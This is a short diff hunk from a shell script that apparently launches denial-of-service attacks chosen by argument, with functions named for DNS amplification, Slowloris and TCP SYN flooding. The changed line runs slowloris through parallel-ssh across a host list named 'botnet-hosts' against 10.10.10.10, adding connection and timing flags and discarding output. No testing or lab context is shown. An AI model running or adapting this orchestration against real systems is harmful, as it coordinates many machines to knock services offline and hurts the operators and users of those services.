@@ -47,7 +47,7 @@ dns-amplification-reflection () {
 }
 
 slowloris () {
-	parallel-ssh -t 300 -h botnet-hosts slowloris 10.10.10.10 >/dev/null 2>&1
+	parallel-ssh -t 300 -h botnet-hosts slowloris --sleeptime 1 -s 300 10.10.10.10 >/dev/null 2>&1
 }
 
 if [ $MYARG = "tcp-syn-flood" ]
